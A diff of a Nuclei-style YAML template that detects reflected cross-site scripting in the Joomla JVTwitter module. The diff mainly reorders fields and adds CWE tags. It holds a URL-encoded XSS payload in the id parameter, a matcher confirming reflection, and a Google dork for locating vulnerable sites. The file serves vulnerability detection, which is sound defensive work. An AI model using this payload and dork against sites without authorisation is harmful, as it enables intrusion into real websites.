@@ -1,5 +1,4 @@
 id: joomla-jvtwitter-xss
-
 info:
   name: Joomla JVTwitter - Cross-Site Scripting
   author: r3Y3r53
@@ -10,24 +9,25 @@ info:
     - https://buaq.net/go-44433.html
     - https://cxsecurity.com/issue/WLB-2020110041
     - https://extensions.joomla.org/
+  classification:
+    cwe-id:
+      - CWE-79
+      - CWE-83
   metadata:
-    verified: true
-    max-request: 2
     google-query: inurl:mod_jvtwitter/jvtwitter.php?id=
-  tags: joomla,jvtwitter,xss,vuln
-
+    max-request: 2
+    verified: true
+  tags: joomla,jvtwitter,vuln,xss
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/modules/mod_jvtwitter/jvtwitter.php?id=%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain);%3E"
-      - "{{BaseURL}}/modules/mod_jvtwitter/jvtwitter.php?id="
-
-    matchers:
-      - type: dsl
+  - matchers:
+      - condition: and
         dsl:
-          - 'status_code_1 == 200'
-          - 'contains(content_type_1, "text/html")'
-          - 'contains(body_1, "><img src=x onerror=prompt(document.domain)")'
-          - 'contains(body_2,"{\"rs\":\"0")'
-        condition: and
-
+          - status_code_1 == 200
+          - contains(content_type_1, "text/html")
+          - contains(body_1, "><img src=x onerror=prompt(document.domain)")
+          - contains(body_2,"{\"rs\":\"0")
+        type: dsl
+    method: GET
+    path:
+      - '{{BaseURL}}/modules/mod_jvtwitter/jvtwitter.php?id=%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain);%3E'
+      - '{{BaseURL}}/modules/mod_jvtwitter/jvtwitter.php?id='
